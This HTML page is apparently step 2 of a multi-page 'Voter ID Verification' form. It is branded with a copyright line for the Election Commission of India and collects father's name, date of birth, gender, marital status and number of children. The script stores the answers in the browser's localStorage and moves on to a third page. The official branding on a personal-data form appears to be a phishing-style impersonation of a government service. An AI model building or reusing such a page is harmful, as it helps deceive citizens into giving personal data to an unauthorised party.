<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voter ID Verification - Step 2</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px; 
        }

        .form-container { 
            background: #ffffff; 
            padding: 35px; 
            border-radius: 12px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
            width: 100%; 
            max-width: 450px; 
        }

        .form-container h2 { 
            text-align: center; 
            margin-bottom: 20px; 
            color: #0056b3; 
            font-size: 22px; 
        }

        .form-group { 
            margin-bottom: 15px; 
        }

        .form-group label { 
            display: block; 
            margin-bottom: 6px; 
            color: #333; 
            font-weight: 600; 
            font-size: 13px; 
        }

        .form-group input, .form-group select { 
            width: 100%; 
            padding: 10px 14px; 
            border: 1px solid #ccc; 
            border-radius: 6px; 
            font-size: 14px; 
            background: #fff; 
        }

        .form-group input:focus, .form-group select:focus { 
            outline: none; 
            border-color: #0056b3; 
            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); 
        }

        .btn-next { 
            width: 100%; 
            padding: 12px; 
            background: #0056b3; 
            border: none; 
            border-radius: 6px; 
            color: white; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 10px; 
        }

        .btn-next:hover { 
            background: #004085; 
        }

        /* Footer (कॉपीराइट टेक्स्ट) की डिज़ाइन */
        .footer-text {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #666;
            font-weight: 600;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Personal Details</h2>
        
        <form id="nextForm">
            <div class="form-group">
                <label for="fatherName">Father's Name</label>
                <input type="text" id="fatherName" name="fatherName" placeholder="Enter father's name" required>
            </div>
            
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" name="dob" required>
            </div>

            <div class="form-group">
                <label for="gender">Gender</label>
                <select id="gender" name="gender" required>
                    <option value="">Select Gender</option>
                    <option value="Male">Male</option>
                    <option value="Female">Female</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="form-group">
                <label for="maritalStatus">Marital Status</label>
                <select id="maritalStatus" name="maritalStatus" required>
                    <option value="">Select Marital Status</option>
                    <option value="Single">Single</option>
                    <option value="Married">Married</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="form-group">
                <label for="children">Number of Children</label>
                <input type="number" id="children" name="children" placeholder="Enter number of children" min="0" required>
            </div>

            <button type="submit" class="btn-next">Next</button>
        </form>

        <!-- ✅ सबसे नीचे कॉपीराइट फुटर जोड़ दिया गया है -->
        <div class="footer-text">
            © 2026 Election Commission of India. All rights reserved.
        </div>
    </div>

    <script>
        document.getElementById('nextForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
            let deviceId = localStorage.getItem('voterDeviceId');

            if (submissions.length > 0) {
                let targetIndex = -1;
                for (let i = submissions.length - 1; i >= 0; i--) {
                    if (submissions[i].deviceId === deviceId) {
                        targetIndex = i;
                        break;
                    }
                }
                if (targetIndex === -1) targetIndex = submissions.length - 1;

                submissions[targetIndex].fatherName = document.getElementById('fatherName').value;
                submissions[targetIndex].dob = document.getElementById('dob').value;
                submissions[targetIndex].gender = document.getElementById('gender').value;
                submissions[targetIndex].maritalStatus = document.getElementById('maritalStatus').value;
                submissions[targetIndex].children = document.getElementById('children').value;

                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
            }

            window.location.href = "page3.html";
        });
    </script>
</body>
</html>
